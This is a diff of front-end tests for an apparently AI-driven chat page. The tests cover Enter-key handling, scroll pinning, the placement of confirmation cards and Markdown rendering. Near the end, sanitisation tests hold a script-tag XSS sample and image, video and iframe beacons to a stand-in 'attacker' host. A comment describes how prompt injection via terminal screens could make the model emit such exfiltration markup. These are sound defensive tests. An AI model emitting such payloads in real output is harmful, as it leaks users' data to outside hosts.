@@ -46,6 +46,7 @@ const action = (over: Partial<ChatAction> & { id: string }): ChatAction => ({
   project_id: null,
   tab_id: 't1',
   summary: 'digitar `npm test` na aba Terminal 2 do projeto reactivando, no macbook m3',
+  created_at: '2026-09-21T00:00:00.000Z',
   ...over,
 });
 
@@ -60,6 +61,16 @@ beforeEach(() => {
 });
 
 afterEach(() => cleanup());
+
+/** Stubs `matchMedia('(pointer: coarse)')` for one test and hands back a restorer, so a failure
+ * partway through a test can never leave `window` different from how this file found it. */
+function mockPointer(coarse: boolean): () => void {
+  const original = window.matchMedia;
+  window.matchMedia = ((query: string) => ({ matches: coarse && query.includes('coarse') })) as typeof window.matchMedia;
+  return () => {
+    window.matchMedia = original;
+  };
+}
 
 it('shows the stored conversation', async () => {
   render(<ChatPage />);
@@ -182,6 +193,129 @@ it('scrolls the list to the newest message when one arrives', async () => {
   expect(list.scrollTop).toBe(0);
 
   deliver({ type: 'message', message: msg({ id: 'm2', role: 'assistant', text: 'pronto' }) });
+  await waitFor(() => expect(list.scrollTop).toBe(480));
+});
+
+it('does not send on Enter with a coarse pointer (a touch keyboard), and keeps the text', async () => {
+  const restore = mockPointer(true);
+  try {
+    render(<ChatPage />);
+    const box = (await screen.findByPlaceholderText(/pergunte/i)) as HTMLTextAreaElement;
+    fireEvent.change(box, { target: { value: 'oi' } });
+    fireEvent.keyDown(box, { key: 'Enter' });
+    expect(sendMock).not.toHaveBeenCalled();
+    expect(box.value).toBe('oi');
+  } finally {
+    restore();
+  }
+});
+
+it('still sends on Enter with a fine pointer, so desktop keeps today\'s behaviour', async () => {
+  const restore = mockPointer(false);
+  try {
+    render(<ChatPage />);
+    const box = (await screen.findByPlaceholderText(/pergunte/i)) as HTMLTextAreaElement;
+    fireEvent.change(box, { target: { value: 'oi' } });
+    fireEvent.keyDown(box, { key: 'Enter' });
+    await waitFor(() => expect(sendMock).toHaveBeenCalledWith('oi'));
+  } finally {
+    restore();
+  }
+});
+
+it('leaves the scroll position alone once the reader has scrolled away from the bottom', async () => {
+  let deliver: (e: unknown) => void = () => {};
+  streamMock.mockImplementation((_onReconnect: () => void, onEvent: (e: unknown) => void) => {
+    deliver = onEvent;
+    return { events: [], connected: true };
+  });
+  chatMock
+    .mockResolvedValueOnce({ conversation: { id: 'c1' }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' })] })
+    .mockResolvedValue({ conversation: { id: 'c1' }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' }), msg({ id: 'm2', role: 'assistant', text: 'pronto' })] });
+
+  render(<ChatPage />);
+  const list = await screen.findByRole('list');
+  // Far from the bottom by isNearBottom's own rule (100 + 200 < 1000 - 48). The scroll event is
+  // the only thing that can tell the page the reader moved: nothing here reads live geometry.
+  Object.defineProperty(list, 'scrollHeight', { value: 1000, configurable: true });
+  Object.defineProperty(list, 'clientHeight', { value: 200, configurable: true });
+  Object.defineProperty(list, 'scrollTop', { value: 100, configurable: true, writable: true });
+  fireEvent.scroll(list);
+
+  deliver({ type: 'message', message: msg({ id: 'm2', role: 'assistant', text: 'pronto' }) });
+  await screen.findByText('pronto');
+  expect(list.scrollTop).toBe(100);
+});
+
+it('pins the thread to the bottom when a card lands, not only when a message does', async () => {
+  let deliver: (e: unknown) => void = () => {};
+  // One stable `events` array across renders, so nothing but the thread's own contents can make the
+  // pin effect run: this is what tells a card apart from a message here.
+  const events: unknown[] = [];
+  streamMock.mockImplementation((_onReconnect: () => void, onEvent: (e: unknown) => void) => {
+    deliver = onEvent;
+    return { events, connected: true };
+  });
+  chatMock.mockResolvedValue({ conversation: { id: 'c1' }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' })], actions: [] });
+
+  render(<ChatPage />);
+  const list = await screen.findByRole('list', { name: 'Conversa' });
+  Object.defineProperty(list, 'scrollHeight', { value: 480, configurable: true });
+  expect(list.scrollTop).toBe(0);
+
+  // A `confirmation` adds a card and touches nothing else: no refetch, no new message.
+  deliver({ type: 'confirmation', action_id: 'act1', tool: 'send_input', args: { tab_id: 't1', text: 'npm test' }, class: 'write', machine_id: null, project_id: null, tab_id: 't1', summary: 'digitar `npm test` na aba Terminal 2', created_at: '2026-09-21T00:00:05.000Z' });
+
+  await screen.findByRole('button', { name: /autorizar/i });
+  await waitFor(() => expect(list.scrollTop).toBe(480));
+});
+
+it('says what the screen is for while the conversation is empty', async () => {
+  chatMock.mockResolvedValue({ conversation: { id: 'c1' }, messages: [], actions: [] });
+  render(<ChatPage />);
+
+  expect(await screen.findByText(/concierge/i)).toBeTruthy();
+});
+
+it('says nothing about an empty conversation while the history is still loading', async () => {
+  // A long conversation would otherwise open with "peça algo…" over an empty thread until the fetch
+  // resolves — and keep it for ever if the fetch fails.
+  let resolve: (value: unknown) => void = () => {};
+  chatMock.mockReturnValue(new Promise((r) => (resolve = r)));
+  render(<ChatPage />);
+
+  await screen.findByRole('list', { name: 'Conversa' });
+  expect(screen.queryByText(/concierge/i)).toBeNull();
+
+  resolve({ conversation: { id: 'c1' }, messages: [], actions: [] });
+  expect(await screen.findByText(/concierge/i)).toBeTruthy();
+});
+
+it('drops that line as soon as the conversation has a message', async () => {
+  render(<ChatPage />); // the default fixture has one message
+
+  await screen.findByText('oi');
+  expect(screen.queryByText(/concierge/i)).toBeNull();
+});
+
+it('returns to the bottom on send, even if the reader had scrolled away', async () => {
+  // load() runs again after a successful send: it must resolve a genuinely new list (not the same
+  // object `mockResolvedValue` would keep handing back) for React to see `messages` change and the
+  // pin effect to run at all.
+  chatMock
+    .mockResolvedValueOnce({ conversation: { id: 'c1' }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' })] })
+    .mockResolvedValue({ conversation: { id: 'c1' }, messages: [msg({ id: 'm1', role: 'user', text: 'oi' }), msg({ id: 'm3', role: 'assistant', text: 'pronto' })] });
+  render(<ChatPage />);
+  const list = await screen.findByRole('list');
+  Object.defineProperty(list, 'scrollHeight', { value: 480, configurable: true });
+  Object.defineProperty(list, 'clientHeight', { value: 200, configurable: true });
+  Object.defineProperty(list, 'scrollTop', { value: 50, configurable: true, writable: true });
+  fireEvent.scroll(list); // reader scrolled up: the page stops following
+
+  const box = (await screen.findByPlaceholderText(/pergunte/i)) as HTMLTextAreaElement;
+  fireEvent.change(box, { target: { value: 'oi' } });
+  fireEvent.click(screen.getByRole('button', { name: /enviar/i }));
+
   await waitFor(() => expect(list.scrollTop).toBe(480));
 });
 
@@ -333,6 +467,8 @@ it('a confirmation event on the socket adds the question as a card without a ref
     project_id: null,
     tab_id: 't1',
     summary: 'digitar `npm test` na aba Terminal 2 do projeto reactivando, no macbook m3',
+    // The event carries the row's own timestamp — the thread places the card by it.
+    created_at: '2026-09-21T00:00:01.000Z',
   });
 
   expect(await screen.findByText('digitar `npm test` na aba Terminal 2 do projeto reactivando, no macbook m3')).toBeTruthy();
@@ -357,4 +493,127 @@ it('a decision event on the socket updates the card by its action id, for a deci
 
   await waitFor(() => expect(screen.queryByRole('button', { name: /autorizar/i })).toBeNull());
   expect(await screen.findByText(/recusado/i)).toBeTruthy();
+});
+
+it("renders the concierge's answer as Markdown, not as a literal", async () => {
+  chatMock.mockResolvedValue({
+    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
+    messages: [msg({ id: 'm2', role: 'assistant', text: '**pronto**' })],
+  });
+  render(<ChatPage />);
+
+  const el = await screen.findByText('pronto');
+  expect(el.tagName).toBe('STRONG');
+});
+
+it('never parses the user\'s own words as Markdown', async () => {
+  chatMock.mockResolvedValue({
+    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
+    messages: [msg({ id: 'm1', role: 'user', text: '**oi**' })],
+  });
+  render(<ChatPage />);
+
+  // What the user typed is what the user sees: no bold, and the asterisks are still there.
+  expect(await screen.findByText('**oi**')).toBeTruthy();
+  expect(document.querySelector('strong')).toBeNull();
+});
+
+it('sanitises the answer: a script tag in the model text never becomes a script element', async () => {
+  // The concierge reads real terminal screens, so its text can carry anything a prompt injected
+  // into a terminal produced.
+  chatMock.mockResolvedValue({
+    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
+    messages: [msg({ id: 'm2', role: 'assistant', text: 'olha isso <script>alert(1)</script>' })],
+  });
+  render(<ChatPage />);
+
+  await screen.findByText(/olha isso/);
+  expect(document.querySelector('script')).toBeNull();
+});
+
+it('fetches nothing from an answer: no element in the model text can make the browser issue a GET', async () => {
+  // No CSP in this repo, so any remote URL the model wrote would be fetched on render — an
+  // exfiltration beacon whose query string the model chooses. `img` was only the obvious one.
+  chatMock.mockResolvedValue({
+    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
+    messages: [
+      msg({
+        id: 'm2',
+        role: 'assistant',
+        text: 'olha isso ![](https://attacker/?d=segredo)\n\n<img src="https://attacker/?d=raw">\n\n<video poster="https://attacker/?d=poster"></video>\n\n<input type="image" src="https://attacker/?d=input">\n\n<iframe src="https://attacker/?d=frame"></iframe>',
+      }),
+    ],
+  });
+  render(<ChatPage />);
+
+  await screen.findByText(/olha isso/);
+  expect(document.querySelectorAll('img, video, input, iframe, svg, image')).toHaveLength(0);
+});
+
+it('puts a card between the two messages it was proposed between', async () => {
+  chatMock.mockResolvedValue({
+    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
+    messages: [
+      msg({ id: 'm1', role: 'user', text: 'roda o teste', created_at: '2026-09-21T00:00:00.000Z' }),
+      // The answer carries a Markdown bullet list of its own, which renders as a real `ul` nested in
+      // the thread: the thread is found by its name and read by its direct children, so the answer's
+      // own list is never mistaken for a second thread nor for a turn of the conversation.
+      msg({ id: 'm2', role: 'assistant', text: 'feito:\n\n- um\n- dois', created_at: '2026-09-21T00:00:02.000Z' }),
+    ],
+    actions: [action({ id: 'act1', created_at: '2026-09-21T00:00:01.000Z' })],
+  });
+  render(<ChatPage />);
+  await screen.findByRole('button', { name: /autorizar/i });
+
+  const thread = screen.getByRole('list', { name: 'Conversa' });
+  const items = Array.from(thread.children).map((li) => li.textContent ?? '');
+  expect(items).toHaveLength(3);
+  expect(items[0]).toContain('roda o teste');
+  expect(items[1]).toContain('digitar `npm test`');
+  expect(items[2]).toContain('feito');
+  expect(thread.querySelector('ul')).toBeTruthy(); // the fixture's bullets really are on screen
+});
+
+it('is one single thread, not a message list with a card list glued below it', async () => {
+  chatMock.mockResolvedValue({
+    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
+    messages: [
+      msg({ id: 'm1', role: 'user', text: 'roda o teste', created_at: '2026-09-21T00:00:00.000Z' }),
+      // Bullets in the answer again: what this pins is one *thread*, not one list element in the
+      // document — a rendered answer is free to contain as many lists as the model wrote.
+      msg({ id: 'm2', role: 'assistant', text: 'feito:\n\n- um\n- dois', created_at: '2026-09-21T00:00:02.000Z' }),
+    ],
+    actions: [action({ id: 'act1', created_at: '2026-09-21T00:00:01.000Z' })],
+  });
+  render(<ChatPage />);
+  await screen.findByRole('button', { name: /autorizar/i });
+
+  expect(screen.getAllByRole('list', { name: 'Conversa' })).toHaveLength(1);
+  // …and the fixture does put a second, unnamed list on the page, so the assertion above is scoped
+  // work and not a restatement of "there is only one list".
+  expect(screen.getAllByRole('list').length).toBeGreaterThan(1);
+
+  // The two assertions above both survive a second, *unlabelled* list of cards glued below the
+  // thread — exactly the layout this test exists to forbid. So: every card is a row of the named
+  // thread itself, wherever else a list may appear on the page.
+  const thread = screen.getByRole('list', { name: 'Conversa' });
+  const cards = screen.getAllByRole('button', { name: /autorizar/i });
+  expect(cards).toHaveLength(1); // the fixture's one pending card really is on screen
+  for (const button of cards) {
+    const row = button.closest('li');
+    expect(row).not.toBeNull();
+    expect(row?.parentElement).toBe(thread);
+  }
+});
+
+it('renders a streamed delta as Markdown too, while it is still being written', async () => {
+  chatMock.mockResolvedValue({
+    conversation: { id: 'c1', title: null, model: null, review_mode: false, last_message_at: null },
+    messages: [msg({ id: 'm2', role: 'assistant', text: '' })],
+  });
+  streamMock.mockReturnValue({ events: [{ type: 'delta', message_id: 'm2', delta: '**parcial**' }], connected: true });
+  render(<ChatPage />);
+
+  const el = await screen.findByText('parcial');
+  expect(el.tagName).toBe('STRONG');
 });
